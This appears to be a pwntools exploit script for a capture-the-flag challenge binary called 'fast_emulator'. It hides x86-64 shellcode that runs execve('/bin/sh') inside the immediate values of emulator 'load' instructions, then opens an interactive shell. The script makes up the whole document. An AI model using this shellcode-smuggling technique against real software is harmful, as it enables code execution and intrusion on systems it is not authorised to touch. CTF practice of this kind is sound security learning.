from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
p=process('./fast_emulator')
def send_asm(s):
    p.recvuntil(b'> ')
    p.sendline(s)
gdb.attach(p,'b *$rebase(0x0000000000001A1D)')
p.recvuntil(b'Please enter the number of lines you want to enter: ')
pause()
p.sendline(b'7')
# send_asm(b'load r1 0x48b82f62696e2f2f2f730000006a6855667788')
list=[b'909090909090',b'50732f2f2f6e69622fb848686a909090',b'0101697268e78948',b'086a56f6310101010124348190909090',b'56e601485e909090',b'3b6ad231e6894890',b'050f589090909090']
# list=[b'6a3b',b'58',b'6a00',b'5a5e',b'5f55',b'0f05']
send_asm(b'load r2 0x'+list[0]+b'55667788')
send_asm(b'load r2 0x'+list[1]+b'55667788')
send_asm(b'load r2 0x'+list[2]+b'55667788')
send_asm(b'load r2 0x'+list[3]+b'55667788')
send_asm(b'load r2 0x'+list[4]+b'55667788')
send_asm(b'load r2 0x'+list[5]+b'55667788')
send_asm(b'load r2 0x'+list[6]+b'55667788')

# send_asm(b'/bin/sh\x00' + b'00000000')
p.interactive()
# send_asm(b'load r1 r2')

# s='mov rsp, rdi'
# print(asm(s)[::-1].hex(),s)
# s='push 0x145'
# print(asm(s)[::-1].hex(),s)

# s='mov rsp, 0x145'
# print(asm(s)[::-1].hex(),s)

# s='mov rax, 0x12345678'
# print(asm(s)[::-1].hex(),s)

# s='mov    rax,0x0'
# print(asm(s)[::-1].hex(),s)

# s='div   rax'
# print(asm(s)[::-1].hex(),s)

# s='sub   rax,rax'
# print(asm(s)[::-1].hex(),s)
